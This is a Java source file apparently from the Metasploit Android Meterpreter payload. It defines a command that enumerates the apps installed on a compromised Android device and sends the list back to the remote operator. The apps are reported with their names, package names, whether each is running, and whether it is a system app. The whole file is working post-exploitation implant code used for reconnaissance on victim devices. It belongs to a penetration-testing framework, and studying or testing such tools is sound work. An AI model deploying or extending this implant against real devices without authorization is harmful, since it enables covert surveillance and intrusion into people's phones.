package com.metasploit.meterpreter.android;

import android.content.Context;

import android.app.ActivityManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.util.List;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class appapi_app_list implements Command {

    private static final int TLV_EXTENSIONS         = 20000;
    private static final int TLV_TYPE_APPS_LIST     = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2911);
    private static final int TLV_TYPE_APPS_LIST_OPT = TLVPacket.TLV_META_TYPE_UINT   | (TLV_EXTENSIONS + 2912);
    final Context context = AndroidMeterpreter.getContext();

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int opt = request.getIntValue(TLV_TYPE_APPS_LIST_OPT);
        PackageManager pm = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager.getRunningAppProcesses();
        for (ApplicationInfo packageInfo : packages) {
            boolean system = (packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            if ((opt == 1 && system || opt == 2 && !system)) {
                continue;
            }
            String label = pm.getApplicationLabel(packageInfo).toString();
            String packageName = packageInfo.packageName;
            boolean running = isAppRunning(procInfos, packageName);
            response.addOverflow(TLV_TYPE_APPS_LIST, label); // App Name
            response.addOverflow(TLV_TYPE_APPS_LIST, packageName); // PackageName
            response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(running)); // Running?
            response.addOverflow(TLV_TYPE_APPS_LIST, Boolean.toString(system)); // System?
        }
        return ERROR_SUCCESS;
    }

    private boolean isAppRunning(List<ActivityManager.RunningAppProcessInfo> procInfos, final String packageName) {
        if (procInfos != null)
        {
            for (final ActivityManager.RunningAppProcessInfo processInfo : procInfos) {
                if (processInfo.processName.equalsIgnoreCase(packageName)) {
                    return true;
                }
            }
        }
        return false;
    }

}
